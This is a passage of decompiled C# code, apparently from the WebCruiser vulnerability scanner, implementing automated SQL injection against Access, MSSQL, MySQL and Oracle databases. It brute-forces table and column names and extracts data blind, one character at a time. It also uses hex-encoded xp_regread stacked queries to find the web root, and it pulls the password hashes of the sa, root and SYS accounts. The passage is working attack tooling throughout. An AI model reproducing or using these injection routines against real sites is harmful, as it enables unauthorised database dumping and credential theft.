			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				formMain_0.gclass0_0.method_4(method_6(string_0));
			}
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return;
			}
			if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
			{
				formMain_0.gclass0_0.method_19(method_18());
			}
			formMain_0.method_11("Getting Tables ...");
			string[] array = WebCruiserWVS.Default.AccessTables.Split(new char[1] { ':' });
			int num = array.Length;
			for (int i = 0; i < num; i++)
			{
				string text = array[i];
				if (!string.IsNullOrEmpty(text))
				{
					ThreadPool.QueueUserWorkItem(method_51, text);
				}
			}
		}
		catch
		{
		}
	}

	private void method_51(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string text2 = string_0 + string_1 + "%20and (select count(1) from [" + text + "])>=0" + string_2;
			string text3 = formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
			if (string.IsNullOrEmpty(text3))
			{
				GClass0.smethod_0("GET  " + text2 + "  NULL");
			}
			else if (text3.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
			{
				method_34("0^" + text);
				string_5 = text;
			}
		}
		catch
		{
		}
	}

	private void method_52(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				formMain_0.gclass0_0.method_4(method_6(string_0));
			}
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return;
			}
			if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
			{
				formMain_0.gclass0_0.method_19(method_18());
			}
			string[] array = WebCruiserWVS.Default.AccessColumns.Split(new char[1] { ':' });
			int num = array.Length;
			int num2 = method_31("0");
			for (int i = 0; i < num2; i++)
			{
				if (!method_32("0^" + i))
				{
					continue;
				}
				formMain_0.method_11("Getting Columns ...");
				string text = method_24("0^" + i);
				for (int j = 0; j < num; j++)
				{
					string text2 = array[j];
					if (!string.IsNullOrEmpty(text2))
					{
						string state = i + "^" + text + "^" + text2;
						ThreadPool.QueueUserWorkItem(method_53, state);
					}
				}
			}
		}
		catch
		{
		}
	}

	private void method_53(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string[] array = ((string)object_0).Split(new char[1] { '^' });
			if (array.Length >= 3)
			{
				string text = array[0];
				string text2 = array[1];
				string text3 = array[2];
				string text4 = string_0 + string_1 + "%20and (select count([" + text3 + "]) from [" + text2 + "])>=0" + string_2;
				string text5 = formMain_0.gclass0_0.method_30(text4, formMain_0.method_0());
				if (string.IsNullOrEmpty(text5))
				{
					GClass0.smethod_0("GET  " + text4 + "  NULL");
				}
				else if (text5.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
				{
					method_35("0^" + text + "^" + text3);
				}
			}
		}
		catch
		{
		}
	}

	private void method_54(int int_1, int int_2)
	{
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			int num = method_31("0");
			int num2 = 0;
			while (true)
			{
				if (num2 < num)
				{
					if (method_32("0^" + num2))
					{
						break;
					}
					num2++;
					continue;
				}
				return;
			}
			string text = method_24("0^" + num2);
			string text2 = "";
			string text3 = "";
			string text4 = "";
			int num3 = method_31("0^" + num2);
			for (int i = 0; i < num3; i++)
			{
				if (method_32("0^" + num2 + "^" + i))
				{
					string text5 = method_24("0^" + num2 + "^" + i);
					if (string.IsNullOrEmpty(text2))
					{
						text4 = "[" + text5 + "]";
					}
					else
					{
						text2 += "%2Bchr(94)%2B";
						text3 += ",";
					}
					text2 = text2 + "cstr([" + text5 + "])";
					text3 = text3 + "[" + text5 + "]";
				}
			}
			int num4 = 0;
			num4 = method_26("select", "count(1)", "from [" + text + "]", int_2, 0);
			formMain_0.method_11("Get Rows Num: " + num4);
			if (num4 == 0)
			{
				MessageBox.Show("No Records Found!", "Information");
				return;
			}
			if (num4 > 0 && num4 < int_2)
			{
				int_2 = num4;
				((ToolStripItem)txtRowsEnd).set_Text(num4.ToString());
			}
			if (int_1 > int_2)
			{
				MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num4);
				return;
			}
			for (int j = int_1 - 1; j < int_2; j++)
			{
				string state = text2 + "^" + j + "^" + text3 + "^[" + text + "]^" + text4;
				ThreadPool.QueueUserWorkItem(method_55, state);
			}
		}
		catch
		{
		}
	}

	private void method_55(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string[] array = ((string)object_0).Split(new char[1] { '^' });
			string string_ = array[0];
			int num = int.Parse(array[1]);
			string text = array[2];
			string text2 = array[3];
			string text3 = array[4];
			string string_2 = method_43("select%20top%201%20", string_, "from (select top " + (num + 1) + " " + text + " from " + text2 + " order by " + text3 + ") T order by " + text3 + " desc", 255, 1024);
			method_41(string_2);
		}
		catch
		{
		}
	}

	private string method_56(string string_8)
	{
		int_0++;
		string text = "WCRTEMP" + $"{int_0:D5}";
		string text2 = string_8 + string_1 + ";create table " + text + "(tmp varchar(255))%3B%44%45%43%4C%41%52%45%20%40%70%20%76%61%72%63%68%61%72%28%32%35%35%29%3B%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%72%65%67%72%65%61%64%20%27%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%27%2C%27%53%4F%46%54%57%41%52%45%5C%4D%69%63%72%6F%73%6F%66%74%5C%49%6E%65%74%53%74%70%27%2C%20%27%50%61%74%68%57%57%57%52%6F%6F%74%27%2C%20%40%70%20%6F%75%74%70%75%74%3Binsert into " + text + "(tmp) values(@p);%2D%2D";
		formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
		formMain_0.gclass0_0.string_6 = method_28("select%20top%201%20", "tmp", "from%20" + text, 255, 255, bool_1: false);
		text2 = string_8 + string_1 + ";drop table " + text + "%3B%2D%2D";
		formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.string_6))
		{
			int_0++;
			text = "WCRTEMP" + $"{int_0:D5}";
			text2 = string_8 + string_1 + ";create table " + text + "(tmp varchar(255))%3B%44%45%43%4C%41%52%45%20%40%70%20%76%61%72%63%68%61%72%28%32%35%35%29%3B%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%72%65%67%72%65%61%64%20%27%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%27%2C%27%53%59%53%54%45%4D%5C%43%6F%6E%74%72%6F%6C%53%65%74%30%30%31%5C%53%65%72%76%69%63%65%73%5C%57%33%53%56%43%5C%50%61%72%61%6D%65%74%65%72%73%5C%56%69%72%74%75%61%6C%20%52%6F%6F%74%73%27%2C%20%27%2F%27%2C%20%40%70%20%6F%75%74%70%75%74%3Binsert into " + text + "(tmp) values(@p);%2D%2D";
			formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
			formMain_0.gclass0_0.string_6 = method_28("select%20top%201%20", "tmp", "from%20" + text, 255, 255, bool_1: false);
			text2 = string_8 + string_1 + ";drop table " + text + "%3B%2D%2D";
			formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
		}
		formMain_0.gclass0_0.string_6 = formMain_0.gclass0_0.string_6.Trim();
		return formMain_0.gclass0_0.string_6;
	}

	private void method_57(object object_0)
	{
		try
		{
			formMain_0.method_11("Auto Checking ...");
			for (int i = 0; i < method_44(listViewEnv); i++)
			{
				if (GClass0.genum4_0 == GEnum4.Stop)
				{
					Thread.CurrentThread.Abort();
				}
				if (!method_45(i))
				{
					continue;
				}
				string text = method_46(i);
				if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
				{
					method_23(string_0);
				}
				if (text.Equals("Server"))
				{
					if (string.IsNullOrEmpty(string_7))
					{
						string_7 = method_47(string_0);
					}
					if (string.IsNullOrEmpty(string_7))
					{
						string_7 = "NULL";
					}
					method_48(i + "^" + string_7);
				}
				else if (text.Equals("Version"))
				{
					string text2 = method_28("select", "@@version", "", 255, 255, bool_1: false);
					if (string.IsNullOrEmpty(text2))
					{
						text2 = "NULL";
					}
					method_48(i + "^" + text2);
				}
				else if (text.Equals("user"))
				{
					string text3 = method_28("select", "user", "", 255, 128, bool_1: false);
					if (string.IsNullOrEmpty(text3))
					{
						text3 = "NULL";
					}
					method_48(i + "^" + text3);
				}
				else if (text.Equals("Database"))
				{
					string text4 = method_28("select", "db_name()", "", 255, 128, bool_1: false);
					if (string.IsNullOrEmpty(text4))
					{
						text4 = "NULL";
					}
					string_6 = text4;
					method_48(i + "^" + text4);
					if (!string.IsNullOrEmpty(text4))
					{
						method_11(text4);
					}
				}
				else if (text.Equals("WWWRoot"))
				{
					string text5 = method_56(string_0);
					if (string.IsNullOrEmpty(text5))
					{
						text5 = "NULL";
					}
					else
					{
						formMain_0.gclass0_0.string_6 = text5;
					}
					method_48(i + "^" + text5);
				}
				else if (text.Equals("IsAdmin"))
				{
					string text6 = method_27("IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00)", 1, 0).ToString();
					method_48(i + "^" + text6);
				}
				else if (text.Equals("Sa_PasswordHash"))
				{
					int_0++;
					string text7 = "WCRTEMP" + $"{int_0:D5}";
					string text8 = string_0 + string_1 + ";create table " + text7 + "(tmp varchar(255));declare @b varbinary(256),@s varchar(256);select @b=password  from master.dbo.sysxlogins where name=0x73006100;exec master..xp_varbintohexstr @b,@s out;insert into " + text7 + " select @s" + string_3;
					formMain_0.gclass0_0.method_30(text8, formMain_0.method_0());
					string text9 = method_28("select%20top%201%20", "tmp", "from%20" + text7, 126, 255, bool_1: false);
					text8 = string_0 + string_1 + ";drop table " + text7 + "%3B" + string_3;
					formMain_0.gclass0_0.method_30(text8, formMain_0.method_0());
					if (string.IsNullOrEmpty(text9))
					{
						text9 = "NULL";
					}
					method_48(i + "^" + text9);
				}
			}
			formMain_0.method_11("Done");
		}
		catch
		{
		}
	}

	private string method_58(string string_8, string string_9, string string_10, int int_1, int int_2)
	{
		string text = "";
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
			{
				method_23(string_0);
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text = method_15(string_8, string_9, string_10, bool_1: false);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			else if (formMain_0.gclass0_0.method_20() == GEnum3.PlainText)
			{
				if (int_2 > 62)
				{
					int int_3 = method_27(string_8 + " length(" + string_9 + ") " + string_10, int_2, 0);
					formMain_0.method_11("Get Length: " + int_3);
					text = method_22(string_8 + "%20" + string_9 + "%20" + string_10, int_3);
				}
				else
				{
					text = method_22(string_8 + "%20" + string_9 + "%20" + string_10, int_2);
				}
				formMain_0.method_11("Get : " + text);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			formMain_0.gclass0_0.method_4(method_6(string_0));
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return "";
			}
			int num = method_27(string_8 + " char_length(" + string_9 + ") " + string_10, int_2, 0);
			formMain_0.method_11("Get Length: " + num);
			if (num < 1)
			{
				return "";
			}
			List<byte> list = new List<byte>();
			for (int i = 0; i < num; i++)
			{
				int num2 = method_27(string_8 + " ord(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, int_1, 0);
				if (num2 >= 0)
				{
					list.Add((byte)num2);
				}
				else
				{
					num2 = method_27(string_8 + " ord(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, 65535, 0);
					if (num2 >= 0)
					{
						byte item = (byte)(num2 >> 8);
						byte item2 = (byte)((uint)num2 & 0xFFu);
						if (formMain_0.gclass0_0.encoding_1 == Encoding.Unicode)
						{
							list.Add(item2);
							list.Add(item);
						}
						else
						{
							list.Add(item);
							list.Add(item2);
						}
					}
					else
					{
						num2 = method_27(string_8 + " ord(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, 15712191, 14712960);
						if (num2 > 0)
						{
							list.Add((byte)(num2 >> 16));
							list.Add((byte)((uint)(num2 >> 8) & 0xFFu));
							list.Add((byte)((uint)num2 & 0xFFu));
						}
						else
						{
							list.Add(95);
						}
					}
				}
				byte[] bytes = list.ToArray();
				text = formMain_0.gclass0_0.encoding_1.GetString(bytes);
				formMain_0.method_11("Get " + (i + 1) + "/" + num + " :  " + text);
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private void method_59()
	{
		formMain_0.method_11("Getting DB ...");
		if (cmbChkAllDB.get_SelectedIndex() == 0)
		{
			string text = method_58("select", "database()", "", 255, 128);
			if (!string.IsNullOrEmpty(text))
			{
				method_11(text);
			}
			formMain_0.method_11("Done");
			return;
		}
		int num = method_27("select count(SCHEMA_NAME) from information_schema.SCHEMATA", 128, 0);
		formMain_0.method_11("Get DB Num: " + num);
		if (num < 1)
		{
			formMain_0.method_11("Done");
			return;
		}
		for (int i = 0; i < num; i++)
		{
			ThreadPool.QueueUserWorkItem(method_60, i);
		}
	}

	private void method_60(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			int num = (int)object_0;
			GClass0.smethod_0("Getting DB id: " + num);
			string string_ = method_58("select", "SCHEMA_NAME", " from information_schema.SCHEMATA limit " + num + ",1", 255, 32);
			method_11(string_);
		}
		catch
		{
		}
	}

	private void method_61(object object_0)
	{
		formMain_0.method_11("Getting Tables ...");
		_ = DateTime.Now;
		string text = "";
		int num = method_31("");
		int num2 = 0;
		while (true)
		{
			if (num2 < num)
			{
				if (method_32(num2.ToString()))
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		text = method_24(num2.ToString());
		int num3 = method_27("select count(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=" + method_37(text), 256, 0);
		formMain_0.method_11("Get Table Num: " + num3);
		if (num3 < 0)
		{
			num3 = 256;
		}
		for (int i = 0; i < num3; i++)
		{
			string state = num2 + "^" + i + "^" + text;
			ThreadPool.QueueUserWorkItem(method_62, state);
		}
	}

	private void method_62(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[1];
			string string_ = array[2];
			string text3 = method_58("select", "TABLE_NAME", " from information_schema.tables where TABLE_SCHEMA=" + method_37(string_) + "%20limit " + text2 + ",1", 255, 32);
			method_34(array[0] + "^" + text3);
		}
		catch
		{
		}
	}

	private void method_63(object object_0)
	{
		_ = DateTime.Now;
		string text = "";
		string text2 = "";
		int num = method_31("");
		for (int i = 0; i < num; i++)
		{
			if (!method_32(i.ToString()))
			{
				continue;
			}
			text = method_24(i.ToString());
			int num2 = method_31(i.ToString());
			for (int j = 0; j < num2; j++)
			{
				if (method_32(i + "^" + j))
				{
					formMain_0.method_11("Getting Columns ...");
					string text3 = "";
					text2 = method_24(i + "^" + j);
					int num3 = method_27("select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=" + method_37(text) + "%20and TABLE_NAME=" + method_37(text2), 128, 0);
					formMain_0.method_11("Get Column Num: " + num3);
					if (num3 < 0)
					{
						num3 = 128;
					}
					for (int k = 0; k < num3; k++)
					{
						text3 = i + "^" + j + "^" + k + "^" + text + "^" + text2;
						ThreadPool.QueueUserWorkItem(method_64, text3);
					}
					break;
				}
			}
		}
	}

	private void method_64(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[0];
			string text3 = array[1];
			string text4 = array[2];
			string string_ = array[3];
			string string_2 = array[4];
			string text5 = method_58("select ", "COLUMN_NAME", "from information_schema.COLUMNS where TABLE_SCHEMA=" + method_37(string_) + "%20and TABLE_NAME=" + method_37(string_2) + "%20limit " + text4.ToString() + ",1", 255, 32);
			method_35(text2 + "^" + text3 + "^" + text5);
		}
		catch
		{
		}
	}

	private void method_65(int int_1, int int_2)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Unknown result type (might be due to invalid IL or missing references)
		formMain_0.method_11("Getting Data ...");
		string text = "";
		string text2 = "";
		foreach (TreeNode node in treeViewDB.get_Nodes())
		{
			TreeNode val = node;
			if (!val.get_Checked())
			{
				continue;
			}
			text = val.get_Text();
			{
				foreach (TreeNode node2 in val.get_Nodes())
				{
					TreeNode val2 = node2;
					if (!val2.get_Checked())
					{
						continue;
					}
					text2 = val2.get_Text();
					string text3 = "";
					foreach (TreeNode node3 in val2.get_Nodes())
					{
						TreeNode val3 = node3;
						if (val3.get_Checked())
						{
							if (!string.IsNullOrEmpty(text3))
							{
								text3 += ",";
							}
							text3 = text3 + "ifnull(cast(`" + val3.get_Text() + "` as char),char(32))";
						}
					}
					text3 = "concat_ws(char(94)," + text3 + ")";
					int num = method_27("select count(1) from " + text + "." + text2, int_2, 0);
					formMain_0.method_11("Get Rows Num: " + num);
					if (num == 0)
					{
						MessageBox.Show("No Records Found!");
						break;
					}
					if (num > 0 && num < int_2)
					{
						int_2 = num;
						((ToolStripItem)txtRowsEnd).set_Text(num.ToString());
					}
					if (int_1 > int_2)
					{
						MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num);
						break;
					}
					for (int i = int_1 - 1; i < int_2; i++)
					{
						string state = text3 + "^" + text + "^" + text2 + "^" + i;
						ThreadPool.QueueUserWorkItem(method_66, state);
					}
					break;
				}
				break;
			}
		}
	}

	private void method_66(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string[] array = ((string)object_0).Split(new char[1] { '^' });
			string string_ = array[0];
			string text = array[1];
			string text2 = array[2];
			string text3 = array[3];
			string string_2 = method_58("select", string_, " from " + text + "." + text2 + " limit " + text3 + ",1", 255, 1024);
			method_41(string_2);
		}
		catch
		{
		}
	}

	private void method_67(object object_0)
	{
		formMain_0.method_11("Auto Checking ...");
		for (int i = 0; i < listViewEnv.get_Items().get_Count(); i++)
		{
			if (!method_45(i))
			{
				continue;
			}
			string text = method_46(i);
			if (text.Equals("Version"))
			{
				string text2 = method_58("select", "@@version", "", 126, 32);
				method_48(i + "^" + text2);
			}
			else if (text.Equals("Server"))
			{
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = method_47(string_0);
				}
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = "NULL";
				}
				method_48(i + "^" + string_7);
			}
			else if (text.Equals("OS"))
			{
				string text3 = method_58("select", "@@version_compile_os", "", 126, 32);
				method_48(i + "^" + text3);
			}
			else if (text.Equals("user"))
			{
				string text4 = method_58("select", "user()", "", 255, 32);
				method_48(i + "^" + text4);
			}
			else if (text.Equals("Database"))
			{
				string text5 = method_58("select", "database()", "", 255, 128);
				method_48(i + "^" + text5);
				if (!string.IsNullOrEmpty(text5))
				{
					method_11(text5);
				}
			}
			else if (text.Equals("root_PasswordHash"))
			{
				string text6 = method_58("select", "Password", "from mysql.user where User=char(114,111,111,116)", 126, 64);
				if (string.IsNullOrEmpty(text6))
				{
					text6 = "NULL";
				}
				method_48(i + "^" + text6);
			}
		}
		formMain_0.method_11("Done");
	}

	public int method_68(int int_1)
	{
		if (int_1 < 128)
		{
			return int_1;
		}
		int num = (int_1 >> 16) & 0xF;
		int num2 = (int_1 >> 8) & 0x3F;
		int num3 = int_1 & 0x3F;
		return (num << 12) + (num2 << 6) + num3;
	}

	public int method_69(int int_1)
	{
		if (int_1 < 128)
		{
			return int_1;
		}
		int num = (int_1 >> 12) & 0xF;
		int num2 = (int_1 >> 6) & 0x3F;
		int num3 = int_1 & 0x3F;
		return (num + 224 << 16) + (num2 + 128 << 8) + (num3 + 128);
	}

	private string method_70(string string_8, string string_9, string string_10, int int_1, int int_2)
	{
		string text = "";
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
			{
				method_23(string_0);
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.PlainText)
			{
				text = method_21(string_8 + "%20" + string_9 + "%20" + string_10);
				formMain_0.method_11("Get : " + text);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			else if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text = method_15(string_8, string_9, string_10, bool_1: false);
				formMain_0.method_11("Get : " + text);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			else if (formMain_0.gclass0_0.method_20() == GEnum3.CrossSite)
			{
				text = method_16(string_8, string_9, string_10);
				formMain_0.method_11("Get : " + text);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			formMain_0.gclass0_0.method_4(method_6(string_0));
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return "";
			}
			int num = method_27(string_8 + " length(" + string_9 + ") " + string_10, int_2, 0);
			formMain_0.method_11("Get Length: " + num);
			List<byte> list = new List<byte>();
			for (int i = 0; i < num; i++)
			{
				int num2 = method_27(string_8 + " ASCII(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, int_1, 0);
				if (num2 >= 0)
				{
					list.Add((byte)num2);
				}
				else
				{
					num2 = method_27(string_8 + " ASCII(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, 65535, 0);
					if (num2 >= 0)
					{
						byte item = (byte)(num2 >> 8);
						byte item2 = (byte)((uint)num2 & 0xFFu);
						if (formMain_0.gclass0_0.encoding_1 == Encoding.Unicode)
						{
							list.Add(item2);
							list.Add(item);
						}
						else
						{
							list.Add(item);
							list.Add(item2);
						}
					}
					else
					{
						num2 = method_27(string_8 + " ASCII(substr(" + string_9 + "," + (i + 1) + ",1)) " + string_10, 15712191, 14712960);
						if (num2 > 0)
						{
							list.Add((byte)(num2 >> 16));
							list.Add((byte)((uint)(num2 >> 8) & 0xFFu));
							list.Add((byte)((uint)num2 & 0xFFu));
						}
						else
						{
							list.Add(95);
						}
					}
				}
				byte[] bytes = list.ToArray();
				text = formMain_0.gclass0_0.encoding_1.GetString(bytes);
				formMain_0.method_11("Get " + (i + 1) + "/" + num + " :  " + text);
			}
			if (!string.IsNullOrEmpty(text))
			{
				return text;
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private void method_71(object object_0)
	{
		formMain_0.method_11("Auto Checking ...");
		for (int i = 0; i < listViewEnv.get_Items().get_Count(); i++)
		{
			if (!method_45(i))
			{
				continue;
			}
			string text = method_46(i);
			if (text.Equals("Version"))
			{
				string text2 = method_70("select", "version", "from v$instance", 126, 64);
				if (string.IsNullOrEmpty(text2))
				{
					text2 = method_70("select", "banner", "from v$version where banner like %27TNS%25%27", 126, 64);
				}
				method_48(i + "^" + text2);
			}
			else if (text.Equals("Server"))
			{
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = method_47(string_0);
				}
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = "NULL";
				}
				method_48(i + "^" + string_7);
			}
			else if (text.Equals("user"))
			{
				string text3 = method_70("select", "user", "from dual", 255, 128);
				method_48(i + "^" + text3);
			}
			else if (text.Equals("instance_name"))
			{
				string text4 = method_70("select", "instance_name", "from v$instance", 255, 128);
				if (string.IsNullOrEmpty(text4))
				{
					text4 = method_70("select", "name", "from v$database", 255, 128);
				}
				if (string.IsNullOrEmpty(text4))
				{
					text4 = method_70("select", "SYS.DATABASE_NAME", "FROM DUAL", 255, 128);
				}
				if (string.IsNullOrEmpty(text4))
				{
					text4 = "NULL";
				}
				method_48(i + "^" + text4);
				if (!string.IsNullOrEmpty(text4))
				{
					method_11(text4);
				}
			}
			else if (text.Equals("SYS_PasswordHash"))
			{
				string text5 = method_70("select", "PASSWORD", "from dba_users where username=chr(83)||chr(89)||chr(83)", 126, 64);
				if (string.IsNullOrEmpty(text5))
				{
					text5 = "NULL";
				}
				method_48(i + "^" + text5);
			}
			else if (text.Equals("user_PasswordHash"))
			{
				string text6 = method_70("select", "PASSWORD", "from dba_users where username=user", 126, 64);
				if (string.IsNullOrEmpty(text6))
				{
					text6 = "NULL";
				}
				method_48(i + "^" + text6);
			}
		}
		formMain_0.method_11("Done");
	}

	private void method_72()
	{
		formMain_0.method_11("Getting DB ...");
		string text = method_70("select", "instance_name", "from v$instance", 255, 128);
		if (!string.IsNullOrEmpty(text))
		{
			method_11(text);
		}
		formMain_0.method_11("Done");
	}

	private void method_73(object object_0)
	{
		formMain_0.method_11("Getting Tables ...");
		int num = method_31("");
		int num2 = 0;
		while (true)
		{
			if (num2 < num)
			{
				if (method_32(num2.ToString()))
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		method_24(num2.ToString());
		int num3 = method_27("select count(TABLE_NAME) from user_tables", 256, 0);
		formMain_0.method_11("Get Table Num: " + num3);
		if (num3 < 0)
		{
			num3 = 256;
		}
		for (int i = 0; i < num3; i++)
		{
			string text = num2 + "^" + (i + 1);
			if (formMain_0.gclass0_0.method_20() == GEnum3.CrossSite)
			{
				method_74(text);
			}
			else
			{
				ThreadPool.QueueUserWorkItem(method_74, text);
			}
		}
	}

	private void method_74(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[1];
			string text3 = method_70("select", "TABLE_NAME", " from (select ROWNUM,table_name from user_tables where rownum<=" + text2 + " order by ROWNUM desc) where rownum<=1", 255, 128);
			method_34(array[0] + "^" + text3);
		}
		catch
		{
		}
	}

	private void method_75(object object_0)
	{
		_ = DateTime.Now;
		string text = "";
		int num = method_31("");
		for (int i = 0; i < num; i++)
		{
			if (!method_32(i.ToString()))
			{
				continue;
			}
			method_24(i.ToString());
			int num2 = method_31(i.ToString());
			for (int j = 0; j < num2; j++)
			{
				if (method_32(i + "^" + j))
				{
					formMain_0.method_11("Getting Columns ...");
					string text2 = "";
					text = method_24(i + "^" + j);
					int num3 = method_27("select count(COLUMN_NAME) FROM user_tab_columns WHERE table_name=" + method_37(text), 128, 0);
					formMain_0.method_11("Get Column Num: " + num3);
					if (num3 < 0)
					{
						num3 = 128;
					}
					for (int k = 0; k < num3; k++)
					{
						text2 = i + "^" + j + "^" + (k + 1) + "^" + text;
						ThreadPool.QueueUserWorkItem(method_76, text2);
					}
					break;
				}
			}
		}
	}

	private void method_76(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[0];
			string text3 = array[1];
			string text4 = array[2];
			string string_ = array[3];
			string text5 = method_70("select ", "COLUMN_NAME", "from (select ROWNUM,COLUMN_NAME FROM user_tab_columns WHERE table_name=" + method_37(string_) + " and rownum<=" + text4 + " order by ROWNUM desc) where rownum<=1", 255, 128);
			method_35(text2 + "^" + text3 + "^" + text5);
		}
		catch
		{
		}
	}

	private void method_77(int int_1, int int_2)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b0: Unknown result type (might be due to invalid IL or missing references)
		formMain_0.method_11("Getting Data ...");
		string text = "";
		foreach (TreeNode node in treeViewDB.get_Nodes())
		{
			TreeNode val = node;
			if (!val.get_Checked())
			{
				continue;
			}
			val.get_Text();
			{
				foreach (TreeNode node2 in val.get_Nodes())
				{
					TreeNode val2 = node2;
					if (!val2.get_Checked())
					{
						continue;
					}
					text = val2.get_Text();
					string text2 = "";
					string text3 = "";
					foreach (TreeNode node3 in val2.get_Nodes())
					{
						TreeNode val3 = node3;
						if (val3.get_Checked())
						{
							if (!string.IsNullOrEmpty(text2))
							{
								text2 += "||chr(94)||";
							}
							text2 = text2 + "NVL(cast(" + val3.get_Text() + " as varchar(64)),chr(32))";
							if (!string.IsNullOrEmpty(text3))
							{
								text3 += ",";
							}
							text3 += val3.get_Text();
						}
					}
					int num = method_27("select count(1) from " + text, int_2, 0);
					formMain_0.method_11("Get Rows Num: " + num);
					if (num == 0)
					{
						MessageBox.Show("No Records Found!");
						break;
					}
					if (num > 0 && num < int_2)
					{
						int_2 = num;
						((ToolStripItem)txtRowsEnd).set_Text(num.ToString());
					}
					if (int_1 > int_2)
					{
						MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num);
						break;
					}
					for (int i = int_1 - 1; i < int_2; i++)
					{
						string state = text2 + ":" + text3 + ":" + text + ":" + i;
						ThreadPool.QueueUserWorkItem(method_78, state);
					}
					break;
				}
				break;
			}
		}
